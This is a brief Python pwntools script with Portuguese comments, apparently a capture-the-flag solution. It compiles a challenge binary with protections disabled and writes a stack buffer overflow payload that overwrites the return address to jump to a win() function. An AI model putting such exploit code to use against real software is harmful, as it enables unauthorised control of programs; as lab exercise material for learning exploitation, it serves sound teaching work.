from pwn import p64, ELF, context
import subprocess

# Primitiva: sobrescrever o endereco de retorno de vuln() para saltar a win().
# Offset ate o endereco de retorno = 64 (buf) + 8 (rbp salvo) = 72.
context.log_level = "error"
subprocess.run(
    ["gcc", "-O0", "-fno-stack-protector", "-no-pie",
     "/challenge/vuln.c", "-o", "/tmp/vuln_solve"],
    check=True,
)
win = ELF("/tmp/vuln_solve").symbols["win"]

payload = b"A" * 72 + p64(win)
open("/home/hacker/payload.bin", "wb").write(payload)
